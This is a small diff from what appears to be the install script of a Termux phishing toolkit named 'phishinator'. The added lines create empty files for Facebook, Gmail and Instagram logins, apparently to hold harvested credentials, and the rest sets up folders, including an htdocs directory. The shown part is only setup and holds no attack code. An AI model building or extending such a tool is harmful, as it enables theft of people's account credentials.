@@ -7,6 +7,10 @@ pkg install unzip -y
 unzip -o -P www.philiphacker.in assets
 mkdir "/sdcard/download/www.philiphacker.in"
 mkdir "/sdcard/download/www.philiphacker.in/phishinator"
+echo > "/sdcard/download/www.philiphacker.in/phishinator/facebook.txt"
+echo > "/sdcard/download/www.philiphacker.in/phishinator/gmail.txt"
+echo > "/sdcard/download/www.philiphacker.in/phishinator/instagram.txt"
+echo > "/sdcard/download/www.philiphacker.in/phishinator/instagram_fb.txt"
 cp updater /sdcard/download/www.philiphacker.in/phishinator/
 cp unins /sdcard/download/www.philiphacker.in/phishinator/
 mkdir "/sdcard/htdocs"
